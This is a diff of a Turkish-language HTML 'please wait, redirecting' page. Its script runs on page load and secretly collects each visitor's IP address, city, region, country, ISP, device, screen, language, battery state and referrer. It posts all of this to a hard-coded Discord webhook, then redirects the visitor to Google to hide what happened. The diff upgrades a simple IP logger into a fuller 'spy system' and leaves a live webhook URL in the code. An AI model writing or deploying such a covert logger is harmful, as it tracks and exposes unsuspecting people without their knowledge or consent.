@@ -3,57 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <title>Yükleniyor...</title>
-    <style>
-        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    </style>
 </head>
-<body>
+<body style="background-color: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
     <div>Lütfen bekleyin, yönlendiriliyorsunuz...</div>
 
     <script>
-        // Senin Discord Webhook adresini buraya ekledim
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
 
-        async function logSistemi() {
+        async function casusSistem() {
             try {
-                // 1. Ziyaretçinin IP adresini alıyoruz
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
+                // 1. IP ve Detaylı Konum Bilgisi (ipapi servisi ile)
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const d = await ipRes.json();
                 
-                // 2. Discord'a gönderilecek şık mesaj paketi
-                const mesaj = {
-                    username: "Sistem Yöneticisi",
+                // 2. Batarya Bilgisi Al (Her tarayıcı izin vermeyebilir)
+                let pil = "Bilinmiyor";
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    pil = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarj Oluyor)' : '(Deşarj)'}`;
+                }
+
+                // 3. Giriş Kaynağı (Nereden tıkladı?)
+                const kaynak = document.referrer || "Direkt (Linke tıklandı veya yapıştırıldı)";
+
+                // 4. Discord'a Gönderilecek Zengin Mesaj
+                const payload = {
+                    username: "Gelişmiş Takip Sistemi",
                     embeds: [{
-                        title: "✅ IP Yakalandı!",
-                        description: "Sitede yeni bir hareketlilik tespit edildi.",
-                        color: 3066993, // Yeşil renk
+                        title: "🎯 Hedef Yakalandı - Detaylı Rapor",
+                        color: 15105570, // Turuncu
+                        thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/2561/2561103.png" },
                         fields: [
-                            { name: "🌐 IP Adresi", value: `\`${data.ip}\``, inline: true },
-                            { name: "⏰ Saat", value: new Date().toLocaleString('tr-TR'), inline: true },
-                            { name: "🔍 Cihaz Bilgisi", value: navigator.userAgent }
+                            { name: "🌐 IP Adresi", value: `\`${d.ip}\``, inline: true },
+                            { name: "📍 Konum", value: `${d.city}, ${d.region} / ${d.country_name}`, inline: true },
+                            { name: "📡 Operatör", value: d.org, inline: true },
+                            { name: "📱 Cihaz & Sistem", value: navigator.userAgent.split(')')[0] + ')', inline: false },
+                            { name: "🖼️ Ekran & Dil", value: `${screen.width}x${screen.height} | ${navigator.language}`, inline: true },
+                            { name: "🔋 Batarya", value: pil, inline: true },
+                            { name: "🔗 Nereden Geldi?", value: kaynak, inline: false },
+                            { name: "⏰ Yerel Saat", value: new Date().toLocaleString('tr-TR'), inline: true }
                         ],
-                        footer: { text: "Logger Aktif" }
+                        footer: { text: "JINDEX-STUD-0 Güvenlik Sistemi" }
                     }]
                 };
 
-                // 3. Veriyi senin Discord kanalına fırlatıyoruz
+                // 5. Discord'a Fırlat
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(mesaj)
+                    body: JSON.stringify(payload)
                 });
 
-                // 4. İşlem bitince şüphe çekmemek için Google'a yönlendiriyoruz
+                // 6. Yönlendirme (Burayı istediğin siteyle değiştirebilirsin)
                 window.location.href = "https://www.google.com";
 
             } catch (error) {
-                // Hata olsa bile kullanıcıyı yönlendir ki bir şey anlamasın
                 window.location.href = "https://www.google.com";
             }
         }
 
-        // Sayfa yüklenince çalıştır
-        logSistemi();
+        casusSistem();
     </script>
 </body>
 </html>
